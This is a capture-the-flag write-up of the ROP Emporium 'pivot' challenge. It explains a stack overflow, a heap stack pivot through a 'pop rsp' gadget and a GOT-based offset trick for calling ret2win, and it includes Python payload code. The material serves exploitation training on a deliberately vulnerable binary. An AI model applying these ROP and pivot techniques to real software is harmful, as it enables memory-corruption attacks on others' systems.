---
title: 07_pivot
categories: series rop_emporium
---

# ROP Emporium pivot

* **Tools:** IDA Free 7.0, gdb-gef, ropper, readelf
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "There's only enough space for a three-link chain on the stack but you've been given space to stash a much larger ROP chain elsewhere. [...] To "stack pivot" just means to move the stack pointer elsewhere."

Here, we have to call the function `ret2win()` exported by the shared library `libpivot.so`. The function `ret2win()` is not directly imported; however, the function `foothold_function()` (also exported by libpivot) is. With some `.got.plt` shenanigans, we'll catch the flag.

When executing the binary, it gives us an address on the heap where to pivot (changing at each execution) and wait for a first input; then, it asks for a second input.

## Allocating memory on the heap

The `main()` function allocate `0x1000000` bytes on the heap, and add `0xffff00` bytes to the returned pointer. The result is passed as argument to the function `pwnme()`:

```
0x00000000004009EE    mov     edi, 1000000h   ; size
0x00000000004009F3    call    _malloc
0x00000000004009F8    mov     [rbp+pHeap_1], rax
0x00000000004009FC    mov     rax, [rbp+pHeap_1]
0x0000000000400A00    add     rax, 0FFFF00h
0x0000000000400A06    mov     [rbp+pHeap_2], rax
0x0000000000400A0A    mov     rax, [rbp+pHeap_2]
0x0000000000400A0E    mov     rdi, rax
0x0000000000400A11    call    pwnme
```

## Function pwnme()

The first input is stored on the heap, while the second input is stored on the stack:

```
0x0000000000400A96    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
0x0000000000400A9D    mov     rax, [rbp+pHeap_2]
0x0000000000400AA1    mov     esi, 100h       ; n
0x0000000000400AA6    mov     rdi, rax        ; s
0x0000000000400AA9    call    _fgets
[...]
0x0000000000400AC7    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
0x0000000000400ACE    lea     rax, [rbp+s]
0x0000000000400AD2    mov     esi, 40h        ; n
0x0000000000400AD7    mov     rdi, rax        ; s
0x0000000000400ADA    call    _fgets
```

Also, the stack buffer is `0x20` bytes long but we can send up to `0x40` bytes to it. 
Looking at the stack when we reach the `ret` instruction at end of the function pwnme() (offset `0x0AE1`), we see the heap pointer stored on the stack frame of the caller:
```
0x00007fffffffe1e8: 0x0000000000400a16 ; <main+128>
0x00007fffffffe1f0: 0x00007ffff7beaf10 ; 0x0000000a61616161 <- pHeap_2
0x00007fffffffe1f8: 0x00007ffff6beb010 ; 0x0000000000000000 <- pHeap_1
```
Hence my first idea was to return to a `pop rsp` gadget, thinking I could have a direct pivot to the heap. However, `_fgets()` add a `0x0A` byte at the end of the input and it screwed up everything. The slightly different strategy was to retrieve the pivot address returned by the nice `printf()` (the string "The Old Gods kindly bestow upon you a place to pivot"...), and to put this value at the end of the stack buffer. Because fuck you \_fgets().

## Step 1: searching a pivot

Because we'll force the pivot value on the stack frame of the caller, we can search a `pop rsp` gadget:

```bash
ropper --search "pop ?sp" -f pivot
[...]
0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret;
```
We find one. There are more `pop` instruction than needed, but that's not a problem: after the first instruction, `RSP` will point to the heap buffer.

So, let's fill the stack as usual and hijack `RIP` to the pivot gadget:
```
\x41\x41\x41\x41\x41\x41\x41\x41  <-+ buffer start 
\x41\x41\x41\x41\x41\x41\x41\x41    |
\x41\x41\x41\x41\x41\x41\x41\x41    |
\x41\x41\x41\x41\x41\x41\x41\x41  <-+ buffer end
\x42\x42\x42\x42\x42\x42\x42\x42  <-- saved RSP 
\x6d\x0b\x40\x00\x00\x00\x00\x00  <-- RIP: ret to pivot gadget (0x00400b6d)
\x??\x??\x??\x??\x??\x??\x??\x??  <-- pivot value (caller local var)
```

## Step 2: calling foothold\_function()

Register `RSP` points to the new frame. However, the gadget used to do that is:
```
pop rsp; pop r13; pop r14; pop r15; ret;
```
This means the heap buffer needs to start with something to put inside `R13`, `R14`, and `R15`. After that, the `ret` instruction will allow us to continue the ROP chain to wherever we want. 
Because we will hijack the `.got.plt` entry of the function `foothold_function()`, we have to call it a first time so the entry gets filled correctly by the OS. Hence, the first part of the heap buffer will look like this:
```
\x43\x43\x43\x43\x43\x43\x43\x43  <-- dummy r13
\x44\x44\x44\x44\x44\x44\x44\x44  <-- dummy r14
\x45\x45\x45\x45\x45\x45\x45\x45  <-- dummy r15
\x50\x08\x40\x00\x00\x00\x00\x00  <-- _foothold_function@plt
```

## Step 3: patching the address of foothold\_function()

Once the `.got_plt` entry of `foothold_function()` is solved (pointer = `0x602048`), we can retrieve it thanks to the useful gadgets kindly provided to us:
```
0x0000000000400B00    pop     rax ; 0x602048 foothold_function@got.plt
0x0000000000400B01    retn
[...]
0x0000000000400B05    mov     rax, [rax] ; foothold_function@libpivot
0x0000000000400B08    retn
``` 
A little `call rax` would hint us we're on a good path to the flag, so:
```bash
ropper --search "call rax" -f pivot
[...]
0x000000000040098e: call rax;
```
Well, at this point using `call rax` would call `foothold_function()` a second time. Wouldn't it be cool if wee could modifiy this address? Again, useful gadgets come to the rescue:
```
0x0000000000400B09    add     rax, rbp
0x0000000000400B0C    retn
```
And ropper says we can control `RBP`:
```bash
ropper --search "pop ?bp" -f pivot
[...]
0x0000000000400900: pop rbp; ret;
```
The last piece of information we need is the value to set in `RBP`. For the version of `libpivot.so` I have, `foothold_function()` is at `0x970`, and `ret2win()` is at `0xABE`. Thus: **0xABE - 0x970 = 0x14e**.

## Putting things together (in Python)

Retrieving the pivot and setting up the stack buffer (second requested input, but it is the first to be executed):

```python
p = process("pivot")
hint = p.recvline_contains("pivot: ").decode("utf8")
pivot = int(hint.split(": ")[1], 16)

stack_payload = b''
stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
stack_payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # overwrite RSP
stack_payload += b'\x6d\x0b\x40\x00\x00\x00\x00\x00'  # overwrite RIP and pivot to heap
stack_payload += p64(pivot)  # overwrite part of main() stack frame
```

Adjusting the new `RSP` and calling `ret2win()` (first requested input, second to be executed):

```python
heap_payload = b''
heap_payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # dummy r13
heap_payload += b'\x44\x44\x44\x44\x44\x44\x44\x44'  # dummy r14
heap_payload += b'\x45\x45\x45\x45\x45\x45\x45\x45'  # dummy r15
heap_payload += b'\x50\x08\x40\x00\x00\x00\x00\x00'  # 0x400850 foothold_function@plt
heap_payload += b'\x00\x0b\x40\x00\x00\x00\x00\x00'  # pop rax; ret
heap_payload += b'\x48\x20\x60\x00\x00\x00\x00\x00'  # foothold_function@got.plt
heap_payload += b'\x05\x0b\x40\x00\x00\x00\x00\x00'  # mov rax, [rax]; ret
heap_payload += b'\x00\x09\x40\x00\x00\x00\x00\x00'  # pop rbp; ret
heap_payload += b'\x4e\x01\x00\x00\x00\x00\x00\x00'  # 0x14e = offset from foothold to ret2win
heap_payload += b'\x09\x0b\x40\x00\x00\x00\x00\x00'  # add rax, rbp; ret
heap_payload += b'\x8e\x09\x40\x00\x00\x00\x00\x00'  # call ret2win@libpivot
```

---
EOF
